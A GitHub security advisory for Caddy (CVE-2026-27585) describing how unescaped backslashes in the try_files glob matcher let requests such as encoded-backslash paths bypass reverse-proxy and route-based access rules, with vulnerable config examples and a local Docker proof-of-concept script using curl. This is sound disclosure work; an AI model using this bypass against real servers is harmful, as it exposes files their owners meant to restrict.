# [M] Caddy: Improper sanitization of glob characters in file matcher may lead to bypassing security protections

## Summary
Severity: Medium
Advisory: GHSA-4xrr-hq4w-6vf4
CVE: CVE-2026-27585
CWE: CWE-20
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-02-24
Source: https://github.com/advisories/GHSA-4xrr-hq4w-6vf4
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=0 <2.11.1

## Details
### Summary

The path sanitization in [file matcher](https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L361) doesn't sanitize backslashes which can lead to bypassing path related security protections.

### Details

The [try_files](https://caddyserver.com/docs/caddyfile/directives/try_files) directive is used to rewrite the request uri. It accepts a list of patterns and checks if any files exist in the root that match the provided patterns. It's commonly used in Caddy configs. For example, it's used in SPA applications to rewrite every route that doesn't exist as a file to `index.html`. 
 
```caddy
example.com {
	root * /srv
	encode
	try_files {path} /index.html
	file_server
}
```

`try_files` patterns are actually glob patterns and file matcher expands them. The `{path}` in the pattern is replaced with
the request path and then [is expanded by `fs.Glob`](https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L398). The request path is sanitized before being placed inside the pattern and the special chars are escaped . [The following code](https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L361) is the sanitization part.   

```go
var globSafeRepl = strings.NewReplacer(
	"*", "\\*",
	"[", "\\[",
	"?", "\\?",
)

expandedFile, err := repl.ReplaceFunc(file, func(variable string, val any) (any, error) {
    if runtime.GOOS == "windows" {
        return val, nil
    }
    switch v := val.(type) {
    case string:
        return globSafeRepl.Replace(v), nil
    case fmt.Stringer:
        return globSafeRepl.Replace(v.String()), nil
    }
    return val, nil
})
```

The problem here is that it does not escape backslashes. `/something-\*/` can match a file named `something-\-anything.txt`, but it should not. The primitive that this vulnerability provides is not very useful, as it only allows an attacker to guess filenames that contain a backslash and they should also know the characters before that backslash.

The backslash is mainly used to escape special characters in glob patterns, but when it appears before non special characters, it is ignored. This means that `h\ello*` matches `hello world` even though `e` is not a special character. This behavior can be abused to bypass path protections that might be in place. For example, if there is a reverse proxy that only allows `/documents/*` to the internal network and its upstream is a Caddy server that uses `try_files`, the reverse proxy's protection can be bypassed by requesting the path `/do%5ccuments/`.

Some configurations that implement blacklisting and serving together in Caddy are also vulnerable but there's a condition that the `try_files` directive and the filtering `route`/`handle` must not be in a same block because `try_files` directive [executes before `route` and `handle` directives](https://caddyserver.com/docs/caddyfile/directives#directive-order). 

For example the following config isn't vulnerable.

```caddy
:80 {
    root * /srv

    route /documents/* {
        respond "Access denied" 403
    }

    try_files {path} /index.html
    file_server
}
```

But this one is vulnerable.

```caddy
:80 {
    root * /srv

    route /documents/* {
        respond "Access denied" 403
    }

    route /* {
        try_files {path} /index.html
    }
    file_server
}
```

This config is also vulnerable because `Header` directives executes before `try_files`. 

```caddy
:80 {
    root * /srv 
    header /uploads/* {
        X-Content-Type-Options "nosniff"
        Content-Security-Policy "default-src 'none';"
    }
    try_files {path} /index.html
    file_server
}
```

### PoC

Paste this script somewhere and run it. It should print "some content" which means that the nginx protection has failed.

```bash
#!/bin/bash

mkdir secret
echo 'some content' > secret/secret.txt

cat > Caddyfile <<'EOF'
:80 {
    root * /srv

    try_files {path} /index.html
    file_server
}
EOF

cat > nginx.conf <<'EOF'
events {}

http {
    server {
        listen 80;
        
        location /secret {
            return 403;
        }

        location / {
            proxy_pass http://caddy;
            proxy_set_header Host $host;
        }
    }
}
EOF

cat > docker-compose.yml <<'EOF'
services:
  caddy:
    # caddy@sha256:c3d7ee5d2b11f9dc54f947f68a734c84e9c9666c92c88a7f30b9cba5da182adb
    image: caddy:latest
    volumes:
      - ./Caddyfile:/etc/caddy/Caddyfile:ro
      - ./secret:/srv/secret:ro
  nginx:
    # nginx@sha256:341bf0f3ce6c5277d6002cf6e1fb0319fa4252add24ab6a0e262e0056d313208
    image: nginx:latest
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
    ports:
      - "8000:80" 
EOF

docker compose up -d
curl 'localhost:8000/secre%5ct/secret.txt'
```

### Impact

This vulnerability may allow an attacker to bypass security protections. It affects users with specific Caddy and environment configurations.

### AI Usage

An LLM was used to polish this report.

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-4xrr-hq4w-6vf4
- https://nvd.nist.gov/vuln/detail/CVE-2026-27585
- https://caddyserver.com/docs/caddyfile/directives#directive-order
- https://github.com/caddyserver/caddy
- https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L361
- https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L398
- https://github.com/caddyserver/caddy/releases/tag/v2.11.1
- https://pkg.go.dev/vuln/GO-2026-4535
